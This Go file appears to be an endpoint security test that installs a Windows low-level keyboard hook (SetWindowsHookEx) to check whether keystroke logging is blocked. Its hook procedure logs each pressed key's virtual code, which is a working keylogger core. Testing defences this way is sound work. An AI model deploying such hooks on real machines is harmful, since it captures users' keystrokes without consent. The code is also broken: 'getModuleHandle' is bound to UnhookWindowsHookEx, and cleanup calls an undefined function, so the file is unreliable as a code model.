//go:build windows
// +build windows

/*
ID: 7ae180e1-e08f-40c2-82db-f274f688eea2
NAME: keystroke Messages Hooking via SetWindowsHookEx
CREATED: 2023-12-19
scenario: keyboard hook procedure [hookProc]
*/

package main

import (
	"fmt"
	Endpoint "github.com/preludeorg/test/endpoint"
	"syscall"
	"unsafe"
)

const (
	WH_KEYBOARD_LL = 13//low-level keyboard hook
	WM_KEYDOWN = 0x0100//key-press
)


// DLL loading
var (
	user32 = syscall.NewLazyDLL("user32.dll")
	kernel32 = syscall.NewLazyDLL("kernel32.dll")
	setWindowsHookEx = user32.NewProc("SetWindowsHookExW")
	callNextHookEx = user32.NewProc("CallNextHookEx")
	getModuleHandle = kernel32.NewProc("UnhookWindowsHookEx")
	hookCallback uintptr
)

type KBDLLHOOKSTRUCT struct {
	VKCode uint32
	ScanCode uint32
	Flags uint32
	Time uint32
	DwExtraInfo uintptr
}

/*
keyboard hook procedure
check if `nCode` is >0 and if `wParam` indicates key press [`WM_KEYDOWN`]
extract key event information from `lParam` [cast to `KBDLLHOOKSTRUCT` pointer]
log virtual key code [`VKCode`]
*/
func hookProc(nCode int, wParam uintptr, lParam uintptr) uintptr{
	if nCode >= 0 && wParam == WM_KEYDOWN {
		kbdstruct := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
		fmt.Printf("key logged: %d\n", kbdstruct.VKCode)
	}
	return callNextHookEx.Call(0, uintptr(nCode), wParam, lParam)
}

/*
test
set low-level keyboard hook [`WH_KEYBOARD_LL`] using `SetWindowsHookEx`
if hook successfully installed -> unprotected
if hook prevented -> protected
*/
func test() {
	Endpoint.Say("setting keyboard hook using setWindowsHookEx")
	hInstance, _, _ := getModuleHandle.Call(0)
	hookCallback, _, _ = setWindowsHookEx.Call(WH_KEYBOARD_LL, syscall.NewCallback(hookProc), hInstance, 0)

	if hookCallback != 0 {
		Endpoint.Say("hook successfully installed. keystroke logging detected")
		Endpoint.Stop(101) // unprotected
	} else {
		Endpoint.Say("hook installation prevented")
		Endpoint.Stop(100) // protected
	}
}

func cleanup() {
	if hookCallback != 0 {
		unhookWindowsHookEx.Call(hookCallback)
	}
}

func main() {
	Endpoint.Start(test, cleanup)
}